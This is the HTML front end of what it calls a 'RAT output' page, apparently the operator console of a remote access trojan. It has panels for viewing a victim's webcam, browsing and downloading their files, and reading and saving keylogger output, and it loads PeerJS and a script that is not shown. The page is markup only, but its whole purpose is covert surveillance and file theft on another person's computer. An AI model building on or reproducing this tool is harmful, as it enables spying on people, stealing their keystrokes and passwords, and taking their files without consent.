<!DOCTYPE html>
<html lang="en">

<head>

    <!--<meta http-equiv="Content-Security-Policy"
        content="default-src 'self' data: gap: https://fonts.googleapis.com'unsafe-eval'; style-src 'self' 'unsafe-inline'; media-src *; img-src 'self' data: content:;">-->
    <meta name="viewport" content="initial-scale=1, width=device-width">
    <meta name="author" content="Samuel A. Matheson">
    <meta charset="utf-8">

    <link rel="icon" href="res/img/47240.png" type="image/png" sizes="32x32">
    <link href="https://fonts.googleapis.com/css?family=Lexend+Deca|Roboto&display=swap" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="res/css/index.css">

    <title>RAT output</title>
</head>

<body>

    <!-- Webcam controls -->
    <div class="view" id="webcam_view">
        <div class="title">Webcam</div>
        <video autoplay="true" id="webcam_preview"></video>
        <div class="btn_wrapper">
            <button id="stop_video" class="video_btn" title="attempt to start video feed">stop video</button>
            <button id="start_video" class="video_btn" title="attempt to close video feed">start video</button>
        </div>
    </div>

    <!-- directory controls -->
    <div class="view" id="directory_view">
        <div class="title" id="full_path">Directories</div>
        <div id="back_a_dir" title="go back a directory"></div>
        <div id="dirbox"></div>
        <div class="btn_wrapper">

            <button id="refresh_file" class="video_btn">Refresh</button>
            <a class="video_btn" id="downloadbtn" href="temp/packae.json" style="display: none;" download></a>
        </div>
    </div>

    <!-- Keylog controls -->
    <div class="view" id="keylog_view">
        <div class="title">Keylogg</div>
        <div id="keybox"></div>
        <div class="btn_wrapper">
            <button id="save_log" class="video_btn" title="save keylog to text file">save keylog</button>
        </div>
    </div>

    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
    <script type="text/javascript" src="res/js/index.js"></script>
</body>

</html>
